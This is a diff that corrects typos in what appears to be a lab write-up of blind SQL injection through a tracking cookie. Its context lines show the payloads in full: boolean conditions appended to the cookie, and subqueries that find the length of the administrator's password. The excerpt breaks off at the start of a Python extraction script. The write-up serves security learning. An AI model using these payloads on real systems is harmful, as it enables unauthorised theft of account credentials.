@@ -532,13 +532,13 @@ I have a tracking id in cookeis like this :TrackingId=NqZivwgKPtLKDW0x;
 
 I can see “welcome back!” if this trakingId be correct, otherwise nothing.
 
-then I added a boolean codition next of tracking id:
+then I added a boolean condition next of tracking id:
 
 ```sql
 TrackingId=NqZivwgKPtLKDW0x' and 1=1-- 
 ```
 
-again I see “Welcome back!”
+again I see “Welcome back!”, then I tested another case:
 
 ```sql
 TrackingId=NqZivwgKPtLKDW0x' and 1=2--
@@ -546,7 +546,7 @@ TrackingId=NqZivwgKPtLKDW0x' and 1=2--
 
 but this time nothing.
 
-so there is a sqli. first I need to know length of password. so I write this:
+so there is a sqli. first I need to know length of password. so I wrote this:
 
 ```sql
 TrackingId=NqZivwgKPtLKDW0x' and 1<(select length(password) from user where username='administrator')--
@@ -560,7 +560,7 @@ TrackingId=NqZivwgKPtLKDW0x' and 20=(select length(password) from user where use
 
 again I see “Welcome back!”
 
-Know I need to write a script to extract 20 chars of administrator’s password.
+Now I need to write a script to extract 20 chars of administrator’s password.
 
 ```python
 import requests
